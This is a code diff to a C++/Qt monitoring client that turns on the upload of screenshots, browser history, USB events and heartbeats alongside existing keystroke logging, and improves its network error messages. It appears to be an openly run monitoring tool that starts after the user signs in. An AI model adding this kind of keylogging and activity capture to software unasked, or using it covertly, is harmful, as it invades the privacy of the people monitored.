@@ -77,7 +77,9 @@ MonitorClient::MonitorClient()
     loadSettings("settings.ini");
     
     macAddress = getMacAddress();
-    lastBrowserTic = -1;
+    // Server Tic responses no longer contain LastBrowserTic. Start with a
+    // bounded lookback rather than blocking history upload indefinitely.
+    lastBrowserTic = QDateTime::currentSecsSinceEpoch()-24*3600;
     
     // Initialize configuration intervals with defaults
     screenInterval = 10;  // Ubuntu default (no screenshot by default)
@@ -107,12 +109,14 @@ MonitorClient::MonitorClient()
     // Do not restart keyboard capture on every USB hotplug — that tears down /dev/input fds and loses keys.
     // Keyboard devices are discovered at startup; restart the app after plugging a USB keyboard if needed.
     
-    // Connect signals to their respective slots
-    // connect(this, &MonitorClient::screen, this, &MonitorClient::getScreen);
-    // connect(this, &MonitorClient::tic, this, &MonitorClient::sendTic);
-    // connect(this, &MonitorClient::browserHistory, this, &MonitorClient::sendBrowserHistories);
+    // Every scheduled telemetry signal must have a handler. Previously only
+    // keyLog was connected, silently disabling screenshots, heartbeats,
+    // browser history, and USB sync despite the timer emitting them.
+    connect(this, &MonitorClient::screen, this, &MonitorClient::getScreen);
+    connect(this, &MonitorClient::tic, this, &MonitorClient::sendTic);
+    connect(this, &MonitorClient::browserHistory, this, &MonitorClient::sendBrowserHistories);
     connect(this, &MonitorClient::keyLog, this, &MonitorClient::sendKeyLogs);
-    // connect(this, &MonitorClient::usbLog, this, &MonitorClient::sendUSBLogs);
+    connect(this, &MonitorClient::usbLog, this, &MonitorClient::sendUSBLogs);
     
     // Capture begins only after the user signs in and selects an assigned monitor.
 
@@ -519,7 +523,13 @@ void MonitorClient::sendScreensAsync(const QString &filePath, std::function<void
                 reason=reply->errorString();
             if(statusCode==401)reason=QStringLiteral("Device session expired or monitor not selected");
             if(reason.isEmpty())reason=QStringLiteral("Unexpected upload response");
-            screenshotUploadError=QStringLiteral("HTTP %1: %2").arg(statusCode).arg(reason.left(180));
+            if(statusCode==0){
+                const QUrl destination=reply->request().url();
+                screenshotUploadError=QStringLiteral("Connection failed to %1:%2 (%3). Check server IP, port and listener.")
+                    .arg(destination.host()).arg(destination.port()).arg(reason.left(100));
+            }else{
+                screenshotUploadError=QStringLiteral("HTTP %1: %2").arg(statusCode).arg(reason.left(180));
+            }
             qWarning().noquote() << "[Screenshot]" << screenshotUploadError;
         }
         reply->deleteLater();
@@ -1050,10 +1060,8 @@ void MonitorClient::monitorTimerTick()
     }
 
     if (currentTime - m_lastEmitHistoryTime >= historyInterval && browserHistoryEnabled) {
-        if (lastBrowserTic != -1) {
-            emit browserHistory();
-            m_lastEmitHistoryTime = currentTime;
-        }
+        emit browserHistory();
+        m_lastEmitHistoryTime = currentTime;
     }
 
     if (currentTime - m_lastEmitKeyLogTime >= keyInterval && keylogEnabled) {
@@ -1209,9 +1217,15 @@ void MonitorClient::sendDataChunkAsync(const QString &serverIP, int serverPort,
             body.value("status").toString()=="success";
         if(!accepted){
             // Log only the structured error, never the submitted event content.
-            qWarning() << "[MonitorUpload]" << eventType << "HTTP" << statusCode
-                       << "Network:" << reply->errorString()
-                       << "Backend:" << body.value("error").toString();
+            const QUrl destination=reply->request().url();
+            if(statusCode==0)
+                qWarning().noquote() << "[MonitorUpload]" << eventType
+                    << "Connection failed to" << destination.host() << ":" << destination.port()
+                    << reply->errorString() << "- check server listener / port / firewall";
+            else
+                qWarning() << "[MonitorUpload]" << eventType << "HTTP" << statusCode
+                           << "Network:" << reply->errorString()
+                           << "Backend:" << body.value("error").toString();
         }
         reply->deleteLater();
         onDone(accepted?1:-1);
